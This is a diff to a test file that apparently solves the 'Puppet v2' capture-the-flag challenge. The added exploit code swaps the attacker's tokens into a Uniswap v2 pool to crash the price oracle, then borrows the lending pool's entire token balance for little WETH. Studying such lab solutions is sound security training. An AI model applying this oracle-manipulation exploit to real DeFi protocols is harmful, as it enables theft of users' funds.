@@ -16,6 +16,7 @@ describe('[Challenge] Puppet v2', function () {
     const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000000');
 
     before(async function () {
+        this.timeout(20000);
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
         [deployer, attacker] = await ethers.getSigners();
 
@@ -81,7 +82,38 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        // same strategy as before, deplete the uniswap v2 pool's WETH balance that drives down the DVT token price
+        // borrow all the token for a bargain WETH price
+
+        const path = [];
+        path[0] = this.token.address;
+        path[1] = this.weth.address;
+
+        // swap all DVT token for ETH
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        const timeStamp = (await ethers.provider.getBlock('latest')).timestamp + 1000;
+        const tx = await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
+            ATTACKER_INITIAL_TOKEN_BALANCE, 10000, path, attacker.address, timeStamp,
+            { gasLimit: 1e6 }
+            );
+        await tx.wait();
+
+
+        let attackerETHBalance = await ethers.provider.getBalance(attacker.address);
+        let attackerETHBalanceMinusGasCost = attackerETHBalance.sub(ethers.utils.parseEther('0.1'));
+
+        // verify that the attacker has more ETH than the required WETH amount to borrow all tokens from the pool
+        expect(
+            await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
+        ).to.be.lt(attackerETHBalanceMinusGasCost);
+
+        // wrap ether and approve to pool
+        await this.weth.connect(attacker).deposit({ value: attackerETHBalanceMinusGasCost, gasLimit: 1e5});
+        await this.weth.connect(attacker).approve(this.lendingPool.address, attackerETHBalanceMinusGasCost);
+
+        // borrow all tokens
+        const tx2 = await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
+        await tx2.wait();
     });
 
     after(async function () {
